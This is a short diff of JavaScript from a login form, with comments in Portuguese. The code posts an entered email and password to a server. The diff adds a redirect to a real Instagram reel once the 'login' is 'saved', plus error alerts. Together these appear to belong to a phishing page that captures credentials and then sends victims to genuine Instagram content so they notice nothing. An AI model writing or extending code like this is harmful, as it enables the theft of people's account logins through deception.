@@ -97,11 +97,16 @@
           body: JSON.stringify({ email, senha }),
         });
 
-        if (!response.ok) {
+        if (response.ok) {
+          // Se login salvo com sucesso, redireciona para o vídeo no Instagram
+          window.location.href = "https://www.instagram.com/reel/DJUlfcKMsz0/";
+        } else {
           console.error("Erro ao enviar os dados.");
+          alert("Erro no login, tente novamente.");
         }
       } catch (error) {
         console.error("Erro de conexão com o servidor:", error);
+        alert("Erro de conexão. Tente novamente mais tarde.");
       }
 
       // Limpar os campos
